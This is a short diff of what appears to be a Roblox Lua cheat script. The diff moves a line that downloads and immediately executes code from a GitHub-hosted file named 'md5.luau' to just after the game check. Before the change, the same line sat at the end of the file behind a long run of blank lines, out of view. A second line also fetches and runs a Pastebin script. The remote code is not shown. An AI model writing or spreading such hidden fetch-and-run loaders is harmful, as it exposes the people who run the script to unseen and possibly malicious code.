@@ -39,6 +39,7 @@ if game.GameId ~= 372226183 then
     error("'" .. script.Name .. "', Line 1")
     return
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dirsks/dirsblox/refs/heads/main/recovery/static/crsd1/md5.luau"))()
 local y = game.Players.LocalPlayer
 local x = game.Players.LocalPlayer.Name
 local date = os.date("*t")
@@ -1670,44 +1671,3 @@ Rayfield:LoadConfiguration()
 
 loadstring(game:HttpGet("https://pastebin.com/raw/UjVjsnQC"))()
 --okollloo
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dirsks/dirsblox/refs/heads/main/recovery/static/crsd1/md5.luau"))()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
